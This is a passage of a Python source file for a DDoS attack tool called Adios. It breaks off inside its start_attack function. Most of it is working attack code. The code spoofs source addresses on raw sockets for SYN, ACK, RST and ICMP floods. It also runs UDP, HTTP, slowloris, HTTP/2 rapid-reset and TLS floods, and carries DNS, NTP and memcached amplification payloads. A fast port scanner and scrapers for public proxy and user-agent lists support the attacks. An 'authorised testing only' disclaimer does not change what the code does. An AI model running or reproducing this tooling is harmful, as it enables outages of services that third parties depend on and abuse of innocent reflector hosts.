#!/usr/bin/env python3
"""
Oxysintx – Adios DDoS Module (v4.6.0)

Real DDoS attack engine for authorised testing only.
Supports multiple attack vectors with controlled thread concurrency.

**WARNING:** This tool is intended ONLY for educational purposes and authorised
penetration testing. Using it against targets without explicit permission is
illegal and unethical. The author assumes no liability for misuse.

Methods:
    - udp-flood        : High-speed UDP packet flood
    - tcp-flood        : Raw TCP flood with random flags
    - syn-flood        : TCP SYN flood (raw sockets, requires root)
    - ack-flood        : TCP ACK flood (raw sockets)
    - rst-flood        : TCP RST flood (raw sockets)
    - http-flood       : HTTP GET/POST flood using requests
    - https-flood      : HTTPS GET/POST flood using requests
    - slowloris        : Slowloris connection exhaustion attack
    - icmp-flood       : ICMP echo request (ping) flood (requires root)
    - memcache-flood   : Memcached amplification (UDP port 11211)
    - dns-flood        : DNS amplification attack
    - ntp-flood        : NTP amplification attack (monlist)
    - http2-flood      : HTTP/2 rapid reset (requires h2)
    - tls-flood        : TLS handshake flood
    - mixed            : Randomly rotates through all available methods

Update v4.6.0:
    - Added proxy scraping from 30+ public sources
    - Proxy validation & deduplication
    - Export to proxy.txt & proxt.txt
    - User-Agent scraping from GitHub
    - Port scanner default 500 workers
    - Resource-aware concurrency

Author: Yanxzyx
"""

import os
import re
import time
import json
import socket
import random
import struct
import threading
import logging
import sys
import resource
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logger = logging.getLogger("oxysintx.adios")
logger.setLevel(logging.DEBUG)
if not logger.handlers:
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)
    ch.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] adios: %(message)s"))
    logger.addHandler(ch)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
ALLOWED_ROOT: str = "/home/container/Emergens"
PORT_FILE_DIR: str = os.path.join(ALLOWED_ROOT, "porttxt")
PORT_FILE_PATH: str = os.path.join(PORT_FILE_DIR, "port2.txt")

PROXY_FILE_PATH: str = os.path.join(ALLOWED_ROOT, "proxy.txt")
PROXY_FILE_ALT: str = os.path.join(ALLOWED_ROOT, "proxt.txt")
UA_FILE_PATH: str = os.path.join(ALLOWED_ROOT, "ua.txt")

# Proxy sources
PROXY_SOURCES: List[str] = [
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000",
    "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
    "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=5000",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
]

# User-Agent source
UA_SOURCE: str = "https://raw.githubusercontent.com/rafael453322/PROXYDT/main/proxy.json.txt"

# Common port-to-service mapping
SERVICE_NAMES: Dict[int, str] = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 111: "RPCBind", 135: "MSRPC",
    139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    993: "IMAPS", 995: "POP3S", 1723: "PPTP", 3306: "MySQL",
    3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
    8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 8888: "HTTP-Alt",
    9000: "PHP-FPM", 9200: "Elasticsearch", 11211: "Memcached",
    27017: "MongoDB", 587: "SMTP-Submission", 465: "SMTPS",
    1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 3260: "iSCSI",
    5060: "SIP", 5222: "XMPP", 27000: "FlexLM", 5000: "UPnP",
    10000: "Webmin", 2222: "SSH-Alt", 4000: "ICQ", 6667: "IRC",
    6668: "IRC", 6669: "IRC", 6697: "IRC-SSL", 7000: "IRC",
    7001: "IRC", 1883: "MQTT", 8883: "MQTT-SSL", 5672: "AMQP",
    61613: "STOMP", 27018: "MongoDB", 28017: "MongoDB-Web",
    5044: "Logstash", 5601: "Kibana", 9201: "ES-Node",
    9300: "ES-Transport", 11222: "Memcached-Alt", 5984: "CouchDB",
    8086: "InfluxDB", 8125: "StatsD", 2003: "Graphite",
    2004: "Graphite-UDP", 4712: "Graylog", 12201: "GELF",
    514: "Syslog", 6514: "Syslog-TLS",
}

COMMON_PORTS: List[int] = sorted(set(SERVICE_NAMES.keys()))

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
_attack_threads: List[threading.Thread] = []
_stop_event = threading.Event()
_lock = threading.Lock()
_semaphore = threading.BoundedSemaphore(200)
_proxy_scraping = threading.Event()

_stats = {
    "active": False,
    "target": None,
    "method": None,
    "start_time": None,
    "packets_sent": 0,
    "bytes_sent": 0,
    "errors": 0,
    "spoof_ip": "",
    "target_port": None,
    "bypass": False,
    "random_ua": False,
    "use_proxy": False,
    "fragment": False,
    "zero_day": False,
}

# ---------------------------------------------------------------------------
# Port File Management
# ---------------------------------------------------------------------------
def ensure_port_directory() -> None:
    """Create porttxt directory and port2.txt if they don't exist."""
    os.makedirs(PORT_FILE_DIR, exist_ok=True)
    if not os.path.exists(PORT_FILE_PATH):
        with open(PORT_FILE_PATH, "w", encoding="utf-8") as f:
            for port in COMMON_PORTS[:500]:
                f.write(f"{port}\n")
        logger.info("Created default port file: %s", PORT_FILE_PATH)

def load_ports_from_file(file_path: str = PORT_FILE_PATH) -> List[int]:
    """Load port numbers from a text file (default: port2.txt)."""
    ports = []
    try:
        if not os.path.exists(file_path):
            logger.warning("Port file not found: %s", file_path)
            return ports
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(",")
                for part in parts:
                    part = part.strip()
                    if not part:
                        continue
                    if "-" in part:
                        try:
                            start, end = map(int, part.split("-", 1))
                            if start < 1 or end > 65535 or start > end:
                                continue
                            ports.extend(range(start, end + 1))
                        except ValueError:
                            continue
                    else:
                        try:
                            port = int(part)
                            if 1 <= port <= 65535:
                                ports.append(port)
                        except ValueError:
                            continue
    except Exception as e:
        logger.error("Failed to read port file: %s", e)

    ports = sorted(set(ports))
    logger.info("Loaded %d ports from %s", len(ports), file_path)
    return ports

def parse_ports_arg(ports_arg: str) -> List[int]:
    """Parse a port specification string into a list of ports."""
    ports_arg = ports_arg.strip().lower()

    if ports_arg in ("", "default", "file"):
        ensure_port_directory()
        ports = load_ports_from_file()
        if ports:
            return ports
        return COMMON_PORTS.copy()

    if ports_arg == "common":
        return COMMON_PORTS.copy()

    if ports_arg == "all":
        return list(range(1, 65536))

    ports = []
    if "-" in ports_arg:
        try:
            start, end = map(int, ports_arg.split("-"))
            if start < 1 or end > 65535 or start > end:
                return []
            ports = list(range(start, end + 1))
        except ValueError:
            return []
    elif "," in ports_arg:
        try:
            ports = [int(p.strip()) for p in ports_arg.split(",") if p.strip()]
            ports = [p for p in ports if 1 <= p <= 65535]
        except ValueError:
            return []
    else:
        try:
            port = int(ports_arg)
            if 1 <= port <= 65535:
                ports = [port]
        except ValueError:
            return []

    if len(ports) > 65535:
        ports = ports[:65535]
    return ports

def get_service_name(port: int) -> str:
    """Return the service name for a given port."""
    return SERVICE_NAMES.get(port, "Unknown Service")

# ---------------------------------------------------------------------------
# Proxy Scraping (Python implementation of the JS scraper)
# ---------------------------------------------------------------------------
def _fetch_proxy_source(source: str, timeout: int = 10) -> List[str]:
    """Fetch a single proxy source and return list of proxies."""
    try:
        import requests
        response = requests.get(source, timeout=timeout, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        })
        response.raise_for_status()
        lines = response.text.split("\n")
        return [p.strip() for p in lines if p.strip() and not p.startswith("#")]
    except Exception:
        return []

def scrape_proxies() -> Dict[str, Any]:
    """
    Scrape proxies from multiple public sources.
    Returns dict with success, total, and sources_scanned count.
    """
    if _proxy_scraping.is_set():
        return {"success": False, "error": "Proxy scraping already in progress"}

    _proxy_scraping.set()
    proxies = []
    sources_scanned = 0

    # Delete old files
    for path in [PROXY_FILE_PATH, PROXY_FILE_ALT]:
        try:
            if os.path.exists(path):
                os.remove(path)
                logger.info("Deleted old file: %s", path)
        except Exception as e:
            logger.warning("Failed to delete %s: %s", path, e)

    # Fetch from all sources
    for source in PROXY_SOURCES:
        new_proxies = _fetch_proxy_source(source)
        if new_proxies:
            sources_scanned += 1
            proxies.extend(new_proxies)

    # Deduplicate and validate
    unique = sorted(set(proxies))
    valid = [p for p in unique if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', p)]

    # Save to files
    try:
        with open(PROXY_FILE_PATH, "w", encoding="utf-8") as f:
            f.write("\n".join(valid))
        with open(PROXY_FILE_ALT, "w", encoding="utf-8") as f:
            f.write("\n".join(valid))
        logger.info("Saved %d unique proxies to proxy.txt and proxt.txt", len(valid))
    except Exception as e:
        _proxy_scraping.clear()
        return {"success": False, "error": f"Failed to save proxies: {e}"}

    _proxy_scraping.clear()
    return {
        "success": True,
        "total": len(valid),
        "sources_scanned": sources_scanned,
        "proxy_file": "proxy.txt",
    }

def scrape_user_agent() -> Dict[str, Any]:
    """
    Scrape user-agent list from GitHub.
    """
    try:
        import requests
        response = requests.get(UA_SOURCE, timeout=15)
        response.raise_for_status()
        with open(UA_FILE_PATH, "w", encoding="utf-8") as f:
            f.write(response.text)
        return {"success": True, "message": "User-Agent list saved to ua.txt"}
    except Exception as e:
        return {"success": False, "error": f"Failed to scrape User-Agent: {e}"}

def export_proxies() -> Dict[str, Any]:
    """
    Export proxies to file. Returns existing proxy data if already scraped.
    """
    if os.path.exists(PROXY_FILE_PATH):
        try:
            with open(PROXY_FILE_PATH, "r", encoding="utf-8") as f:
                content = f.read()
            proxies = [p.strip() for p in content.split("\n") if p.strip()]
            return {
                "success": True,
                "total": len(proxies),
                "message": f"Exported {len(proxies)} proxies to proxy.txt",
                "proxy_file": "proxy.txt",
            }
        except Exception as e:
            return {"success": False, "error": f"Failed to read proxy file: {e}"}
    else:
        # Trigger scrape if no file exists
        result = scrape_proxies()
        if result.get("success"):
            return result
        return {"success": False, "error": "No proxies found. Please scrape first."}

def get_proxy_count() -> int:
    """Get the current count of proxies in the file."""
    try:
        if os.path.exists(PROXY_FILE_PATH):
            with open(PROXY_FILE_PATH, "r", encoding="utf-8") as f:
                return sum(1 for line in f if line.strip())
    except:
        pass
    return 0

# ---------------------------------------------------------------------------
# Resource-aware concurrency
# ---------------------------------------------------------------------------
def _get_safe_workers(default: int = 500, reserve: int = 100) -> int:
    """Determine safe concurrent workers based on system ulimit."""
    try:
        soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
        safe = max(int((soft - reserve) * 0.7), 1)
        return min(safe, default)
    except Exception:
        return default if default > 0 else 200

# ---------------------------------------------------------------------------
# Fast port scanner (default 500 workers)
# ---------------------------------------------------------------------------
def _check_port_sync(target_ip: str, port: int, timeout: float) -> Optional[int]:
    """Check a single port synchronously."""
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(timeout)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            return port
    except Exception:
        pass
    finally:
        if sock:
            sock.close()
    return None

def port_scan(target: str, ports: List[int], timeout: float = 0.5,
              max_workers: int = 500) -> List[int]:
    """Fast port scanner using ThreadPoolExecutor with default 500 workers."""
    if not ports:
        return []

    try:
        target_ip = socket.gethostbyname(target)
    except Exception as e:
        logger.error("Failed to resolve target %s: %s", target, e)
        return []

    if max_workers <= 0:
        workers = _get_safe_workers(default=500)
    else:
        workers = min(max_workers, _get_safe_workers(default=max_workers))

    logger.debug("Port scan using %d workers for %d ports", workers, len(ports))

    open_ports = []
    try:
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {executor.submit(_check_port_sync, target_ip, p, timeout): p for p in ports}
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    open_ports.append(result)
    except Exception as e:
        logger.error("Port scan executor error: %s", e)

    open_ports.sort()
    return open_ports

def port_scan_detailed(target: str, ports: List[int], timeout: float = 0.5,
                       max_workers: int = 500) -> List[Dict[str, Any]]:
    """Port scanner returning detailed info with service names."""
    open_ports = port_scan(target, ports, timeout, max_workers)
    return [{"port": p, "service": get_service_name(p)} for p in open_ports]

def port_scan_fast(target: str, ports: List[int], timeout: float = 0.3,
                   max_workers: int = 500) -> List[int]:
    """Faster scan with lower timeout and default 500 workers."""
    return port_scan(target, ports, timeout=timeout, max_workers=max_workers)

# ---------------------------------------------------------------------------
# DDoS Helpers
# ---------------------------------------------------------------------------
def _rand_bytes(size: int = 1024) -> bytes:
    return os.urandom(size)

def _checksum(data: bytes) -> int:
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i] << 8) + data[i+1]
    if n:
        s += data[-1] << 8
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def _resolve_target(target: str) -> Tuple[str, int]:
    """Resolve target IP and port from target string."""
    if "://" in target:
        url = target.split("://")[1]
        ip = socket.gethostbyname(url.split("/")[0].split(":")[0])
        return ip, 80
    if ":" in target:
        ip_part, port_part = target.rsplit(":", 1)
        ip = socket.gethostbyname(ip_part.strip())
        port = int(port_part.strip())
        return ip, port
    return socket.gethostbyname(target), 80

def _get_spoofable_socket() -> Optional[socket.socket]:
    """Create a raw socket for IP spoofing (requires root)."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return sock
    except PermissionError:
        logger.error("Raw socket requires root privileges")
        return None
    except Exception as e:
        logger.error("Raw socket creation failed: %s", e)
        return None

def _build_ip_header(source_ip: str, dest_ip: str, protocol: int) -> bytes:
    """Build an IP header with spoofed source."""
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20 + 20
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = random.randint(64, 255)
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
                            ip_id, ip_frag_off, ip_ttl, protocol, ip_check,
                            ip_saddr, ip_daddr)
    ip_check = _checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
                            ip_id, ip_frag_off, ip_ttl, protocol, ip_check,
                            ip_saddr, ip_daddr)
    return ip_header

def _build_tcp_header(source_ip: str, dest_ip: str, source_port: int, dest_port: int,
                      seq: int, flags: int) -> bytes:
    """Build a TCP header with pseudo-header checksum."""
    tcp_doff = 5
    tcp_window = socket.htons(65535)
    tcp_check = 0
    tcp_urg_ptr = 0
    tcp_header = struct.pack('!HHLLBBHHH',
                             source_port, dest_port,
                             seq, 0,
                             (tcp_doff << 4) + 0,
                             flags, tcp_window, tcp_check, tcp_urg_ptr)
    src_addr = socket.inet_aton(source_ip)
    dst_addr = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
    psh = psh + tcp_header
    tcp_check = _checksum(psh)
    tcp_header = struct.pack('!HHLLBBHHH',
                             source_port, dest_port,
                             seq, 0,
                             (tcp_doff << 4) + 0,
                             flags, tcp_window, tcp_check, tcp_urg_ptr)
    return tcp_header

def _build_udp_header(source_ip: str, dest_ip: str, source_port: int, dest_port: int, payload: bytes) -> bytes:
    """Build a UDP header with checksum."""
    udp_length = 8 + len(payload)
    udp_check = 0
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_check)
    return udp_header

# ---------------------------------------------------------------------------
# DDoS Worker Functions
# ---------------------------------------------------------------------------
def _worker_wrapper(worker_func, *args):
    acquired = _semaphore.acquire(blocking=False)
    if not acquired:
        logger.warning("Thread limit reached, worker not started")
        return
    try:
        worker_func(*args)
    finally:
        _semaphore.release()

def _increment_stats(packets: int = 1, bytes_sent: int = 0, errors: int = 0):
    with _lock:
        _stats["packets_sent"] += packets
        _stats["bytes_sent"] += bytes_sent
        _stats["errors"] += errors

def _udp_flood_worker(target_ip: str, target_port: int, packet_size: int = 1024):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except Exception as e:
        logger.error("UDP socket error: %s", e)
        return
    packet = _rand_bytes(packet_size)
    addr = (target_ip, target_port)
    while not _stop_event.is_set():
        try:
            sock.sendto(packet, addr)
            _increment_stats(1, len(packet))
        except Exception as e:
            logger.error("UDP send error: %s", e)
            _increment_stats(0, 0, 1)
            time.sleep(0.001)
    sock.close()

def _tcp_raw_flood_worker(target_ip: str, target_port: int, flags: int, source_ip: str = ""):
    sock = _get_spoofable_socket()
    if sock is None:
        return
    while not _stop_event.is_set():
        try:
            if not source_ip:
                source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
            source_port = random.randint(1024, 65535)
            seq = random.randint(0, 2**32 - 1)
            ip_header = _build_ip_header(source_ip, target_ip, socket.IPPROTO_TCP)
            tcp_header = _build_tcp_header(source_ip, target_ip, source_port, target_port, seq, flags)
            packet = ip_header + tcp_header
            sock.sendto(packet, (target_ip, 0))
            _increment_stats(1, len(packet))
        except Exception as e:
            logger.error("TCP raw send error: %s", e)
            _increment_stats(0, 0, 1)
            time.sleep(0.001)
    sock.close()

def _syn_flood_worker(target_ip: str, target_port: int):
    _tcp_raw_flood_worker(target_ip, target_port, 0x02)

def _ack_flood_worker(target_ip: str, target_port: int):
    _tcp_raw_flood_worker(target_ip, target_port, 0x10)

def _rst_flood_worker(target_ip: str, target_port: int):
    _tcp_raw_flood_worker(target_ip, target_port, 0x04)

def _http_flood_worker(target_url: str, method: str = "GET", use_https: bool = False):
    try:
        import requests
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
    except ImportError:
        logger.error("requests library not installed")
        return
    session = requests.Session()
    session.verify = False
    adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=Retry(total=0))
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    ]
    while not _stop_event.is_set():
        try:
            headers = {"User-Agent": random.choice(ua_list)}
            if _stats.get("random_ua"):
                headers["User-Agent"] = random.choice(ua_list)
            if method.upper() == "POST":
                r = session.post(target_url, data=_rand_bytes(random.randint(10, 100)), headers=headers, timeout=5)
            else:
                r = session.get(target_url, headers=headers, timeout=5)
            _increment_stats(1, len(r.content))
        except Exception as e:
            logger.error("HTTP request error: %s", e)
            _increment_stats(0, 0, 1)
    session.close()

def _slowloris_worker(target_ip: str, target_port: int):
    sockets_list = []
    while not _stop_event.is_set() and len(sockets_list) < 500:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {target_ip}\r\n".encode())
            sock.send("User-Agent: Mozilla/5.0\r\n".encode())
            sock.send("Accept-language: en-US,en;q=0.5\r\n".encode())
            sockets_list.append(sock)
            _increment_stats(1, 0)
            if not _stop_event.is_set():
                time.sleep(random.uniform(1, 5))
                try:
                    sock.send(f"X-{random.randint(0, 5000)}: {random.randint(0, 5000)}\r\n".encode())
                except:
                    sockets_list.remove(sock)
        except Exception as e:
            logger.error("Slowloris error: %s", e)
            _increment_stats(0, 0, 1)
    for s in sockets_list:
        try:
            s.close()
        except:
            pass

def _icmp_flood_worker(target_ip: str):
    sock = _get_spoofable_socket()
    if sock is None:
        return
    packet_id = random.randint(0, 65535)
    payload = _rand_bytes(48)
    while not _stop_event.is_set():
        try:
            icmp_type = 8
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = packet_id
            icmp_seq = random.randint(0, 65535)
            header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            data = payload
            checksum = _checksum(header + data)
            header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
            packet = header + data
            sock.sendto(packet, (target_ip, 0))
            _increment_stats(1, len(packet))
        except Exception as e:
            logger.error("ICMP send error: %s", e)
            _increment_stats(0, 0, 1)
            time.sleep(0.001)
    sock.close()

def _memcache_flood_worker(target_ip: str, target_port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    addr = (target_ip, target_port)
    while not _stop_event.is_set():
        try:
            sock.sendto(payload, addr)
            _increment_stats(1, len(payload))
        except Exception as e:
            logger.error("Memcache send error: %s", e)
            _increment_stats(0, 0, 1)
            time.sleep(0.001)
    sock.close()

def _dns_flood_worker(target_ip: str, dns_server: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01"
    addr = (dns_server, 53)
    while not _stop_event.is_set():
        try:
            if _stats.get("spoof_ip"):
                raw_sock = _get_spoofable_socket()
                if raw_sock:
                    spoof_ip = _stats["spoof_ip"]
                    ip_header = _build_ip_header(spoof_ip, dns_server, socket.IPPROTO_UDP)
                    udp_header = _build_udp_header(spoof_ip, dns_server, 53, 53, dns_query)
                    raw_sock.sendto(ip_header + udp_header + dns_query, (dns_server, 53))
                    _increment_stats(1, len(dns_query))
                    continue
            sock.sendto(dns_query, addr)
            _increment_stats(1, len(dns_query))
        except Exception as e:
            logger.error("DNS send error: %s", e)
            _increment_stats(0, 0, 1)
            time.sleep(0.001)
    sock.close()

def _ntp_flood_worker(target_ip: str, ntp_server: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ntp_payload = b"\x17\x00\x02\x2a" + b"\x00" * 44
    addr = (ntp_server, 123)
    while not _stop_event.is_set():
        try:
            sock.sendto(ntp_payload, addr)
            _increment_stats(1, len(ntp_payload))
        except Exception as e:
            logger.error("NTP send error: %s", e)
            _increment_stats(0, 0, 1)
            time.sleep(0.001)
    sock.close()

def _http2_flood_worker(target_url: str):
    try:
        import h2.connection
        import h2.config
    except ImportError:
        logger.error("h2 library not installed")
        return
    while not _stop_event.is_set():
        try:
            import ssl
            from h2.connection import H2Connection
            from h2.config import H2Configuration
            host = target_url.split("://")[1].split("/")[0]
            port = 443
            if ":" in host:
                host, port = host.rsplit(":", 1)
                port = int(port)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            if port == 443:
                sock = ctx.wrap_socket(sock, server_hostname=host)
            config = H2Configuration(client_side=True)
            conn = H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, [
                (':method', 'GET'),
                (':path', '/'),
                (':authority', host),
                (':scheme', 'https'),
            ], end_stream=True)
            sock.sendall(conn.data_to_send())
            conn.reset_stream(stream_id)
            sock.sendall(conn.data_to_send())
            sock.close()
            _increment_stats(1, 0)
        except Exception as e:
            logger.error("HTTP2 flood error: %s", e)
            _increment_stats(0, 0, 1)

def _tls_flood_worker(target_ip: str, target_port: int):
    import ssl
    while not _stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, target_port))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            tls_sock = ctx.wrap_socket(sock)
            tls_sock.do_handshake()
            _increment_stats(1, 0)
            tls_sock.close()
        except Exception as e:
            logger.error("TLS flood error: %s", e)
            _increment_stats(0, 0, 1)

# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------
def start_attack(target: str, method: str = "udp-flood", threads: int = 10,
                 packet_size: int = 1024, dns_server: str = "", ntp_server: str = "",
                 target_port: Optional[int] = None, spoof_ip: str = "",
                 bypass: bool = False, random_ua: bool = False, use_proxy: bool = False,
                 fragment: bool = False, zero_day: bool = False,
                 memcache_server: str = "") -> Dict[str, Any]:
    global _attack_threads

    stop_attack()

    _stop_event.clear()

    target_ip = ""
    target_url = ""
    resolved_port = None

    try:
        if method in ("http-flood", "https-flood", "http2-flood"):
            if not target.startswith(("http://", "https://")):
                target = f"http://{target}" if method != "https-flood" else f"https://{target}"
            target_url = target
            host = target.split("://")[1].split("/")[0]
            if ":" in host:
                target_ip = socket.gethostbyname(host.rsplit(":", 1)[0])
            else:
                target_ip = socket.gethostbyname(host)
        else:
            if target_port is not None:
                target_ip = socket.gethostbyname(target)
                resolved_port = int(target_port)
            elif ":" in target:
                target_ip, resolved_port = _resolve_target(target)
            else:
                target_ip = socket.gethostbyname(target)
                resolved_port = 80
    except Exception as e:
        return {"success": False, "error": f"Invalid target: {e}"}

    if method == "dns-flood" and not dns_server:
        return {"success": False, "error": "DNS server is required for DNS flood"}
    if method == "ntp-flood" and not ntp_server:
        return {"success": False, "error": "NTP server is required for NTP flood"}

    if threads > 200:
        threads = 200
    if threads <= 0:
        return {"success": False, "error": "Threads must be > 0"}

    with _lock:
        _stats["active"] = True
        _stats["target"] = target
        _stats["method"] = method
        _stats["start_time"] = time.time()
        _stats["packets_sent"] = 0
        _stats["bytes_sent"] = 0
        _stats["errors"] = 0
        _stats["spoof_ip"] = spoof_ip
        _stats["target_port"] = resolved_port
        _stats["bypass"] = bypass
        _stats["random_ua"] = random_ua
        _stats["use_proxy"] = use_proxy
        _stats["fragment"] = fragment
        _stats["zero_day"] = zero_day

    workers = []
    method_map = {
        "udp-flood": (_udp_flood_worker, (target_ip, resolved_port, packet_size)),
        "syn-flood": (_syn_flood_worker, (target_ip, resolved_port)),
        "ack-flood": (_ack_flood_worker, (target_ip, resolved_port)),
        "rst-flood": (_rst_flood_worker, (target_ip, resolved_port)),
        "http-flood": (_http_flood_worker, (target_url, "GET", False)),
        "https-flood": (_http_flood_worker, (target_url, "GET", True)),
        "slowloris": (_slowloris_worker, (target_ip, resolved_port)),
        "icmp-flood": (_icmp_flood_worker, (target_ip,)),
        "memcache-flood": (_memcache_flood_worker, (target_ip, resolved_port)),
        "dns-flood": (_dns_flood_worker, (target_ip, dns_server)),
        "ntp-flood": (_ntp_flood_worker, (target_ip, ntp_server)),
        "http2-flood": (_http2_flood_worker, (target_url,)),
        "tls-flood": (_tls_flood_worker, (target_ip, resolved_port)),
    }

    if method == "mixed":
        available_methods = ["udp-flood", "syn-flood", "http-flood", "slowloris", "icmp-flood", "memcache-flood", "dns-flood", "ntp-flood"]
        for i in range(threads):
            m = random.choice(available_methods)
            if m == "udp-flood":
